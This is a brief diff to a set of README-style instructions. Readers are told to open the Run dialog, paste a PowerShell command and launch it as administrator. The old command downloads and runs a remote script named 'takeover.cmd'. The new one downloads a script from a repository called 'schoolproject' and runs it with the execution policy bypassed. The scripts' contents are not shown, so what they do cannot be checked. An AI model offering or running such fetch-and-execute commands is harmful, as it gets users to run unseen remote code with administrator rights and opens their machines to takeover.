@@ -2,6 +2,6 @@
 - `Win`**+** `R`
 - Paste:
 ```
-cmd /k powershell  -command "wget https://raw.githubusercontent.com/Fidasek009/1337/main/takeover.cmd -outfile takeover.cmd; .\takeover.cmd"
+powershell wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/run.ps1 -outfile run.ps1; powershell -ExecutionPolicy Bypass -File .\run.ps1
 ```
 - `Ctrl` **+** `Sift` **+** `Enter`
